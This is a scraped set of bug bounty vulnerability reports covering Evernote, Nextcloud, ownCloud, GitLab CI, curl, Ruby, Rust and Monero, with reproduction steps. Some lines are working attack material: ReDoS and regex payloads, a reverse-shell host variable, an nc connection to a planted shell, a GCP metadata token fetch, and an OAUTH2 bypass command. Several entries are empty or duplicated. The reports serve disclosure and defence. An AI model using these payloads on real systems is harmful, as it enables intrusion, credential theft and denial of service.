The spoofed link can refer to files in ~/.ssh, ~/.gnupg, /etc, /proc/, /sys, thus, the nature of the disclosed data varies from secrets/credentials to system configurations, hardware info, firewall rules, and so on.
An attacker could gain access to sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information.


Report:  scrapers\reports\1377748.json
This vulnerability is similar to my previous reported vulnerability #1362313 , in here also weakness is path transversal vulnerability which helps me to acheive code execution but the root cause is different.
some part of this app is written in java and some parts are written in react native.
In evernote we can share notes and notebooks with others. In notes we can also add attachments and there is option to rename the added attachment. When renaming i founded that special characters are not restricted,for example file uploaded with name libjnigraphics.so can be renamed to ../../../lib-1/libjnigraphics.so and when the attachment is downloaded it is downloaded with filename ../../../lib-1/libjnigraphics.so.
The evernote android app also does not sanitize the received filename, so when user clicks on attachment,instead of attachment getting downloaded in /data/data/com.evernote/cache/preview/:UUID/ this directory it is downloaded into /data/data/com.evernote/lib-1/libjnigraphics.so which results into remote code execution.
#1362313 report vulnerability root cause was that the app was not sanatizing the value of _display_name from the provider of received content:// uri that resulted into ACE.
This report's root cause is that app is extracting attachment filename from content-disposition header eg:- content-disposition: attachment; filename="../../../lib-1/libjnigraphics.so" and the evernote app is not sanatizing the received filename from the response header.
The attachment download logic is written in react-native and the source file is compiled into hermes javascript bytecode, so i am not able to show the exact vulnerable code like i did in my last report.
The conclusion i reached was that fixing this report #1362313 bug will not fix this vulnerability so i am writing a new report.
[add details for how we can reproduce the issue]
Add the native-library poc file to a note libjnigraphics.so (F1489257)
Rename the attachment to ../../../lib-1/libjnigraphics.
Invite the victim to your note.
Step 2 is needed,i don't know why Shareable link feature is not working on evernote android app without sending an invitation
Click on 3 dots > copy internal link > copy web link OR copy app link(which is android deeplink and can be triggred from websites)
Send link to victim and open the link (1st click)
Click on attachment when note is opened (2nd click)
Close the evernote app and open it again.
From adb shell run nc 127.0.0.1 6666
POC VIDEO

Video F1489256: Screencast_from_21-10-21_09_24_02_PM_IST.webm 5.47 MiB
remote code execution in evernote android app with 2 clicks.


Report:  scrapers\reports\1378706.json
The method block_params in class RDoc::MethodAttr uses a regular expression that is vulnerable to Denial of Service due to catastrophic backtracking.
The regular expression is:
([A-Z:a-z0-9_]+)\.([a-z0-9_]+)(\s*\(\s*[a-z0-9_.,\s]*\s*\)\s*)?
Source: https://github.com/ruby/ruby/blob/master/lib/rdoc/method_attr.rb#L265
The ReDoS requence is: (\s*\(\s*[a-z0-9_.,\s]*\s*\)\s*). It contains three overlapping repeating groups (repeated characters are 0x20, 0xa0, [09-0d]), so the worst-case complexity is cubic as there are 3 infinitely repeating groups. Cubic complexity here means that if the vulnerable part of the string is doubled in length, the execution time should be about 8 times longer (2^3).
I have not found a way to exploit this vulnerability directly from the file documentation (by running rdoc), however directly it is very easy:
use 'rdoc'
RDoc::MethodAttr.new(nil, nil).block_params = '0.0(' + ' '*3456 + '0'
The client's code that relies on AnyMethod is also vulnerable since it inherits MethodAttr:
use 'rdoc'
RDoc::AnyMethod.new(nil, nil).block_params = '0.0(' + ' '*3456 + '0'
If an attacker provides a malicious string to AnyMethod|MethodAttr's block_params documentation parser, it will get stuck processing the input for an extremely long time, consuming 100% CPU.
An attacker could cause an effective denial of service, by crafting an input which exploits catastrophic backtracking for the regular expression.


Report:  scrapers\reports\1379707.json
Report:  scrapers\reports\1397826.json
I have found an official unclaimed s3 bucket of tendermint i.e. http://tendermint-packages.s3-website-us-west-1.amazonaws.com/ which is also used by many other blockchain companies and developers .
Image F1510071: tendermintpoc1.png 40.29 KiB
Image F1510070: tendermintpoc2.png 140.38 KiB
Check your internal code if there is any usage of unclaimed s3 bucket and claim the unclaimed s3 bucket(let me know when i should unclaim it from my side)
An attacker can host its contents and malicious files on the official bucket of tendermint which can cause harm to the companies or developers using your bucket for package installation and etc. This bug has a severe impact if it is used internally by tendermint and other companies.
Regards,
Gaurav Bhatia


Report:  scrapers\reports\1408692.json
The Android client of nextcloud (com.nextcloud.client) allows arbitrary file including protected/private files to be leaked through the file upload functionality.
A report 1142918 has been submitted for the vulnerability of leaking arbitrary protected files. NextCloud added a fix on May 18, 2021, which added a check to the class src/main/java/com/owncloud/android/files/services/FileUploader.java:
        if (file.getStoragePath().startsWith("/data/data/")) {

The fix checks whether a file to be uploaded has a path starting with "/data/data". However, the check is not sufficient. We can easily bypass this check using the path "/data/user/0/" e.g. "/data/user/0/com.nextcloud.client/". A program to exploit this vulnerability can be:
public class EvilActivity extends AppCompatActivity {

A working POC is as follows:
### 1. install and login nextcloud android client e.g. through the provider https://us.cloudamo.com
### 2. create a directory and set it 'shareable'
### 3.install the POC app with the program above
### 4. Navigate to the shareable directory in the step2, click '+', then choose "upload content from other apps"
### 5. Select "poc" then protected file will be uploaded to the shared folder, which is publicly shared and leaked.
A sample screenshot with protected files uploaded and their content is:

Image F1523976: nextcloud_file_upload.png 71.64 KiB


Image F1523979: nextcloud_prefs.png 163.76 KiB
Arbitrary sensitive file of the nextcloud android client can be leaked. To address this issue, disallow any file whose path has the package name but isn't in the temp or cache folder of nextcloud.
Please investigate. Thanks.


Report:  scrapers\reports\1434179.json
Report Submission Form
Kubernetes docs have Spanish translation available. One of the pages of the Portuguese doc has an external reference to a website .
The website is not registered and can be purchased and used to host malicious content.
NA
NA
## Steps To Reproduce:
As an attacker, I can host malicious content on the website.
I can also, host malicious sdk or softwares, which user will think is part of the deployment docs as its referred in kubernetes.io, this can lead to RCE for users who are referring to this doc.


Report:  scrapers\reports\1434967.json
Report Submission Form
Kubernetes in its docs https://kubernetes-csi.github.io have a drivers list.
One of the driver was pointing to an external github account. That github account was not registered on github.com
So I was able to takeover the account and host PoC
NA
NA
Image F1556768: Screenshot_from_2021-12-23_19-20-35.png 273.54 KiB
An attacker can takeover the repository and host malicious code on it, when any user or employee will refer the docs and tries to download the dirver, they will end up using malicious code which could lead to RCE.


Report:  scrapers\reports\1439355.json
Shopify have a github repository https://github.com/Shopify/unity-buy-sdk
In the repository there is a github action, which is used a base action from an external github repository.
That github account as not registered on github.com
So I was able to takeover the account and host PoC.
NA
NA`
Note: I haven't taken over the repository, so as to avoid breaking the existing action as its getting used.
Image F1565368: Screenshot_from_2022-01-02_16-40-54.png 84.85 KiB
https://hackerone.com/reports/1087489
An attacker can takeover the github account and host malicious action on it, when any any pull request is sent on the repository, it will end up running the action and you can see below screenshot, unity credentials are getting passed to that action. Action will get access to shopify's credentials.
Image F1565369: Screenshot_from_2022-01-02_16-46-48.png 33.53 KiB
Also, since github actions can create github tokens for use at run time using ${{ secrets.GITHUB_TOKEN }} an attacker can get access to all the private repositories of the organization


Report:  scrapers\reports\1442118.json
It is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.
This is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.
From this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.
image: python:latest

export HOST=your.reverse.shell.box # customise this!

Based on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured.
Being able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network. It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.
I did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.
Repo: https://gitlab.com/ec0bb/citest
GCP access (albeit limited) -
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

docker access
root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps

runner TLS keys for communicating with the runner manager (also used for logstash auth)
root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*

Unconfined remote code execution on CI host machines
Access to GCP API
Access to internal GCP network


Report:  scrapers\reports\1444501.json
Hello team, I hope you're doing well! The URI parser mishandles invalid URLs that have two # characters. It does correctly identify that they're invalid, but the regex performs very poorly and execution time grows much faster than the string length.
I found this somewhat accidentally when fuzzing for something else. I'm not sure if you care about such issues but I figured I'd report it anyway. The length of the strings required to actually cause the process to hang are very long, but it's not really an issue when the user-controlled input is sent in a request body.
Run the following script
require 'benchmark'
require 'uri'
def parse(n)
  URI('https://example.com/dir/' + 'a' * n + '/##.jpg')
  rescue URI::InvalidURIError
  # Invalid URI because of the two #
end
n = 50000
Benchmark.bm(7) do |x|
  x.report('Base length') { parse(n) }
  x.report('Length x2  ') { parse(n * 2) }
  x.report('Length x4  ') { parse(n * 4) }
  x.report('Length x8  ') { parse(n * 8) }
end
Here's the output on my machine
              user     system      total        real

We can see the execution time is roughly quintuples when the string length only doubles.
Here's my Ruby version
$ ruby -v
ruby 3.1.0p0 (2021-12-25 revision fb4df44d16) [x86_64-linux]
High resource consumption, reduced performance, denial of service


Report:  scrapers\reports\1450368.json
nextcloud allowed multiple account within the android client app on a single lock
1.open nextcloud app
2.add security password to protect the app
3.close the app
again open the app and now show the password to open the app
[list any additional material (e.g. screenshots, logs, etc.)]
if an attacker has physical access to an android mobile without screen lock,but with nextcloud installed and set up,he can easily access the nextcloud-files.
regards:Javed Ahmad


Report:  scrapers\reports\1454002.json
There is an issue that allows to retrieve any files from protected directory of application - /data/data/com.owncloud.android/*.
The issue is caused by exported activity com.owncloud.android.ui.activity.ReceiveExternalFilesActivity with intent filter android.intent.action.SEND_MULTIPLE that accepts URI of files for upload. Any 3rd-party application could start this activity and upload on server any files such as database file from protected directory in context of owncloud application.
Tested on latest stable version of app - 2.19.
Version of android - 11.
Java PoC:
StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();

Mitigation:
There is valid protection for preventing reading files from directory /data/data/com.owncloud.android/* in similar intent-filter android.intent.action.SEND. Copy this protection for android.intent.action.SEND_MULTIPLE.
Potential attacker could steal files from protected directory of application for example files of databases, cache and history of files.


Report:  scrapers\reports\1455257.json
Report:  scrapers\reports\1455987.json
Report:  scrapers\reports\1511619.json
Report:  scrapers\reports\1511843.json
Monero daemon (monerod) does not limit Content-length variable when processing incoming HTTP requests.
We can force monerod to allocate arbitrary amount of memory.
How to reproduce:
1) compile monero https://github.com/monero-project/monero
2) run it:
$ ulimit -Sv 1000000000
$ ./bin/monerod --rpc-login test:test --rpc-bind-ip 0.0.0.0 --confirm-external-bind
3) run attached script m1.py
$ python2 ./m1.py 192.168.1.34
4) after some time OOM killer will stop monerod
monerod process can be stopped remotely, no authentication is required.
An access to JSON RPC port is enough.


Report:  scrapers\reports\1518036.json
Rust's regex crate guarantees a linear time complexity with regex length for compilation of untrusted regexes. However, existing mitigations for known malicious regexes are based on memory usage and, as such, do not mitigate repetitions of empty sub-expressions. For example, the following payload triggers such an issue:
(?:){4294967295}
This will cause the regex compiler to attempt to create 4294967295 instances of an empty sub-expression, which will ultimately allocate zero bytes and therefore bypass existing memory-based mitigations. This can be further weaponised to create an exponential time complexity with regex length by using repetitions of repetitions, e.g.:
(?:){64}{64}{64}{64}{64}{64}
This payload would cause the regex compiler to attempt to create 64^6 instances of an empty sub-expression.
An attacker can induce a CPU time-based denial of service with effectively infinite CPU time, which would cause the service to become entirely unavailable.


Report:  scrapers\reports\1519099.json
With the default configuration in Electron, renderer processes (which should not have access to system resources by default) can gain read/write access to a nearby bluetooth device. To reproduce:
If an Electron app loads remote or untrusted content in a renderer process (which is normally fine, as the process should not have any privileges), the remote content would have read/write access to nearby bluetooth devices. The impact would then depend on what devices the user has nearby.


Report:  scrapers\reports\1520931.json
The implementation of std::fs::remove_dir_all() in the Rust standard library is vulnerable to a time-of-check to time-of-use link replacement attack. This applies to all versions of Rust before 1.58.1.
The documentation of std::fs::remove_dir_all() guarantees that the function does not follow symbolic links:
Removes a directory at this path, after removing all its contents. Use carefully!
This function does not follow symbolic links and it will simply remove the symbolic link itself.
The vulnerable implementation for Windows is in library/std/src/sys/windows/fs.rs. For other platforms it is in library/std/src/sys_common/fs.rs. Both use a remove_dir_all_recursive() helper function which does the actual recursion and deletion. It opens directory by the given path and iterates the directory entries. For each directory entry it checks if the entry is a directory and recurses into it if it is. If it is not it is deleted using std::fs::remove_file(). On the way back up the now empty directories are deleted using std::fs::remove_dir()
There are two problems with this implementation if the attacker has write access to a directory which is being deleted by the privileged process:
The type of a directory entry is checked and it is being recursed into if it is a directory. There is a short time window between the check and the opening of the subdirectory which an attacker can exploit by replacing the subdirectory with symlink causing the symlink to be followed.
The path given to std::fs::remove_dir_all() is extended with subentry paths which are then used to process subdirectories and delete directory entries. Paths are resolved by the operating system each time they are passed to a system call. If the attacker can replace a descendent directory of the directory passed to remove_dir_all() while a subdirectory of it is being processed with a symlink he can cause that symlink to be followed in subsequent filesystem operations.
A proof-of-concept code demonstrating the vulnerability is attached.
If the attacker has write access to a directory which is being deleted by the privileged process using remove_dir_all() he can trick the process to delete any sensitive files or directory subtrees that the privileged process can.


Report:  scrapers\reports\1521610.json
Curl remains in infinite loop with suitable MQTT server response.
Run the following on linux with the attached file "poc" :
$ socat -u FILE:poc TCP-LISTEN:12345,reuseaddr,fork
Use curl:
$ curl mqtt://localhost:12345
Observe output of "top".
[list any additional material (e.g. screenshots, logs, etc.)]
Debug trace output before going to the loop:
=> Send header, 26 bytes (0x1a)

This section of lib/multi.c looks suspicious (line 2132 points here before entering the loop):
   2130             /* DO was not completed in one function call, we must continue

Jenny Heino and Antti Levom�ki from Forcepoint
Attacker can cause a Denial of Service by delivering malicious content behind a MQTT URL. For example internet crawlers could be affected, or any other implementations automatically fetching provided URLs using curl.


Report:  scrapers\reports\1526328.json
A cached connection authenticated with the OAUTH2 mechanisms can be reused by a subsequent request even if the bearer is not correct.
This affects SASL-enabled protcols: SMPTP(S), IMAP(S), POP3(S) and LDAP(S) (openldap only).
An application that can be accessed by more than one user (such as a webmail server) would be affected by this flaw.
curl 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user: --oauth2-bearer validbearer --next 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user: --oauth2-bearer anything
As an alternative to apply the patch, use another (unused) password within each request: the second request in the command below will properly fail.
curl 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user:dummy1 --oauth2-bearer validbearer --next 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user:dummy2 --oauth2-bearer anything
Access (read/write) unauthorized data


Report:  scrapers\reports\1529790.json
Report:  scrapers\reports\1538004.json
Hello Gents,
Read-only administrator is able to edit and "Agents Update"


Report:  scrapers\reports\1542881.json
I'm using curl 7.82.0 on Linux. When the file specified by the -K option can't be read, curl sends network traffic as specified by the other options that are explicitly included on the command line (in other words, there's only a warning and I'd like it to be a fatal error). This behavior occurs even if those other options result in an action that's often considered unsafe, such as use of cleartext passwords. It's fine for curl to be capable of sending cleartext passwords, but this shouldn't happen unintentionally.
I feel that this is a vulnerability in curl because curl is able to recognize that the user's intended set of options was not specified correctly, but curl still decides to send network traffic corresponding to the known subset of those options. One might argue that, philosophically, curl prefers to send network traffic even if the user's input is underspecified; however, this isn't true elsewhere in curl. For example, if the user misspells one of the options on the command line, curl doesn't simply ignore that one, and do whatever is specified by the remaining, correctly spelled options. Instead, any misspelled option is a fatal error, and curl sends no network traffic at all. My suggestion is to make this -K situation consistent with that, i.e., if the file specified by -K can't be read, then that is a fatal error and no network traffic is sent.
A fatal error is the approach taken by many other programs in analogous cases, i.e., the program allows a security-relevant user-specified configuration file on the command line, and that file can't be read, e.g.,
  % ssh -F /home/user/my-safe-ssh-options/not-exist.config example.com

In other words, ssh realizes it would be wrong to simply use the system-wide SSH client configuration when the user is clearly trying to use a different configuration. The tar program realizes it would be wrong to simply place every file into a public archive, when the user is clearly trying to use -X to exclude specific files. With curl, the user is clearly trying to add some options, which may perhaps be critical for security in that user's use case.
Here's an example in which a curl user wishes to send secret credentials to an FTP server only if the FTP server supports SSL, analogous to the curl --ssl-reqd ftp://example.com example on the https://curl.se/docs/manpage.html page. The user chooses to use only a filename (named my-curl-ftp-options.config below), not a full pathname, with the -K option, just as in the curl --config file.txt https://example.com example on that page.
This example includes a user mistake, but the vulnerability is also relevant without any user mistake.
SSL detection works fine if the user's current working directory contains the my-curl-ftp-options.config file. However, the user then makes the realistic mistake of changing to a different working directory without changing the -K value. (Here, the user goes to the /mnt/LargeVolume/user directory because it has much more disk space for storing the large FTP downloads.) Indeed, curl warns the user, but then immediately sends the unsafe network traffic.
For purposes of the example, ftp.dlink.de is used (it always demands a password, but all combinations of usernames and passwords succeed).
% /usr/bin/curl -L -s -S -o /home/user/curl https://github.com/moparisthebest/static-curl/releases/download/v7.82.0/curl-i386

% cd /mnt/LargeVolume/user

In Part 2, the cleartext network traffic exchanged begins with:
220 D-Link FTP Server.ready ...

In Part 1, the network traffic exchanged is the following. The cleartext password is never sent:
220 D-Link FTP Server.ready ...

As mentioned above, if the user had underspecified the desired network traffic by misspelling an option (e.g., the wrong spelling --ssl-required instead of the correct spelling -ssl-reqd), then there would be a fatal error, and no network traffic (such as a cleartext password) would be sent:
% /home/user/curl --ssl-required -u secretu:secretp --no-progress-meter ftp://ftp.dlink.de 2>&1 | head -6

In a more realistic case, the user would not use ftp.dlink.de, but would instead use a series of FTP servers that are normally intended to support SSL. The user would want to place --ssl-reqd in a configuration file because it applies to every server. However, the user would want to place the username and password on the command line because they are different for every server.
An exploitation scenario (protocol downgrade attack) without a user mistake is:
This vulnerability report is not specific to FTP or SSL. There are many other scenarios in which a missing option makes the network traffic less safe, and they add motivation for introducing a fatal error when the -K file can't be read. Some of the other scenarios are:
In the main example above, the attacker can discover a cleartext password. More generally, the attacker can achieve any security impact that any curl option was trying to prevent. For example, the victim's source IP address may be leaked if the curl option was to use a proxy server. The connection may honor a revoked certificate if the curl option was to specify a local file with a Certificate Revocation List. Several others may also be relevant depending on the protocols and threat model.


Report:  scrapers\reports\1547877.json
The Aiven JDBC sink includes the SQLite JDBC Driver. This JDBC driver can be used to upload SQLite database files onto the server. The HTTP sink connector allows sending HTTP requests to localhost. There is unprotected Jolokia listening on localhost:6725. JMX exports the com.sun.management:type=DiagnosticCommand MBean, which contains the jvmtiAgentLoad operation. This operation can be used to execute the SQLite database as JVM Agent by embedding the JVM Agent JAR file inside the SQLite database as an BLOB field in a table.
Video F1703051: 2022-04-22_15-14-04.mp4 1.16 MiB
RCE on the Kafka Connect server


Report:  scrapers\reports\1548535.json
curl command --libcurl option can be tricked to generate C code that when compiled contains arbitrary code execution.
Note: In this PoC older compiler is simulated by passing -trigraphs option to gcc.
To remedy this issue ? chars should be quoted to \? in the generated strings.
Code injection to generated source code.
However, the impact of this vulnerability is minimal due to difficultly in finding scenarios where it would be practically exploitable. To be even remotely plausible curl command should somehow be hooked into a system that uses --libcurl to generate, compile and finally execute the compiled code while also accepting external user input for the curl command options. This seems extremely unlikely to happen in real life.
Trigraph support has also largely been disabled by now (gcc and clang have it disabled by default at least).
I don't really mind if this is found to be "not a vulnerability" (or only self-exploitable). In this case just close this H1 ticket and create a regular GitHub issue / or fix it direct.


Report:  scrapers\reports\1549435.json
CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256 base64 encoded host fingerprint is compared case-insensitive by accident. This means that it is technically possible (however still difficult) to create forged ssh host key that matches in this comparison.
The bug appears to have been introduced when adding CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256 support, and then copying the case insensitive comparison of the string for CURLOPT_SSH_HOST_PUBLIC_KEY_MD5 (where it is appropriate since the MD5 fingerprint is a hex string).
This bug as added by commit https://github.com/curl/curl/commit/d1e7d9197b7fe417fb4d62aad5ea8f15a06d906c
Host identify spoofing


Report:  scrapers\reports\1549461.json
Due to logic flaw in CURLOPT_SSH_HOST_PUBLIC_KEY_MD5 handling, the host fingerprint validation will be bypassed if the passed a string that is not exactly 32 characters long.
Note: curl command is not affected since it explicitly checks that the --hostpubmd5 string is 32 characters long, and if it is not PARAM_BAD_USE is returned.
The bug is at https://github.com/curl/curl/blob/f7f26077bc563375becdb2adbcd49eb9f28590f9/lib/vssh/libssh2.c#L733
If the string length is other than 32 it should result in signature check failure instead of success. Obvious fix would be to remove the if(pubkey_md5 && strlen(pubkey_md5) == 32)test completely.
SSH host identify bypass.
For this issue to be realised, a wrong size fingerprint needs to be passed (either by accident or by malice). It is likely that this is far more likely to happen by accident, since if some actor can tamper with the fingerprints they can bypass the validation anyway. Note that curl_easy_setopt CURLOPT_SSH_HOST_PUBLIC_KEY_MD5 does not return an error indicating that something is wrong, hence this is breaking the principle of least surprise.


Report:  scrapers\reports\1549636.json
Due to a bug in the Regexp compilation process, creating a Regexp object with a crafted source string could cause the same memory to be freed twice. This is known as a �double free� vulnerability. Note that, in general, it is considered unsafe to create and use a Regexp object generated from untrusted input. In this case, however, following a comprehensive assessment, we treat this issue as a vulnerability.
poc:
ruby -e '/(\\x15\\x17\\xE2\\xF5\\xF5\\xF5\\xC2\\x04\\x08J,\\x00\\xD0\\x00\\x00(?(1)\\xF5\\xF5\\xF5\\xD7\\xF5\\xF5\\xF5\\x87\\x04\\xFA555\\xBEJ,\\x18FF\\x15\\xFF|\\x03\\x01\\x00\\x01\\x00\\x00\\x8F\r|)44\\x00\\x8F\r|)+/m'
may lead to a RCE attack cooperate with marshal.load


Report:  scrapers\reports\1552110.json
libcurl might reuse OAUTH2-authenticated connections without properly making
sure that the connection was authenticated with the same credentials as set
for this transfer. This affects SASL-enabled protcols: SMTP(S), IMAP(S),
POP3(S) and LDAP(S) (openldap only).
libcurl maintains a pool of connections after a transfer has completed. The
pool of connections is then gone through when a new transfer is requested and
if there's a live connection available that can be reused, it is preferred
instead of creating a new one.
A connection that is successfully created and authenticated with a user name +
OAUTH2 bearer could subsequently be reused even for user + [other OAUTH2
bearer], even though that might not even be a valid bearer. This could lead to
an authenticion bypass, either by mistake or by a malicious actor.
The problem can be demontrated using an imap server supporting OAUTH2 authentication using command:
curl 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user: --oauth2-bearer validbearer --next 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user: --oauth2-bearer anything
Note:
This vulnerability has been assigned CWE-305 "Authentication Bypass by Primary Weakness" that is not selectable on the current IBB form.
Unauthorized access.


Report:  scrapers\reports\1555440.json
lib/telnet.c suboption function incorrecly checks for the sscanf return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:
if(sscanf(v->data, "%127[^,],%127s", varname, varval)) {
As such it is possible to construct environment values that don't update the varval buffer and instead use the previous value. In combination of advancing in the temp buffer by strlen(v->data) + 1, this means that there will be uninitialized gaps in the generated output temp buffer. These gaps will contain whatever stack contents from previous operation of the application.
Fortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:
attacker is able to control the environment passed to libcurl via CURLOPT_TELNETOPTIONS ("NEW_ENV=xxx,yyy") and control xxx and yyy in the curl_slist entries)
attacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to
When both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte temp buffer.
Steps To Reproduce:
Run telnet service
tcpdump -i lo -X -s 65535 port 23
Execute
lib/telnet.c suboption function incorrecly checks for the sscanf return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:
if(sscanf(v->data, "%127[^,],%127s", varname, varval)) {
As such it is possible to construct environment values that don't update the varval buffer and instead use the previous value. In combination of advancing in the temp buffer by strlen(v->data) + 1, this means that there will be uninitialized gaps in the generated output temp buffer. These gaps will contain whatever stack contents from previous operation of the application.
Fortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:
attacker is able to control the environment passed to libcurl via CURLOPT_TELNETOPTIONS ("NEW_ENV=xxx,yyy") and control xxx and yyy in the curl_slist entries)
attacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to
When both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte temp buffer.
Steps To Reproduce:
Run telnet service
tcpdump -i lo -X -s 65535 port 23
Execute


Report:  scrapers\reports\1567257.json
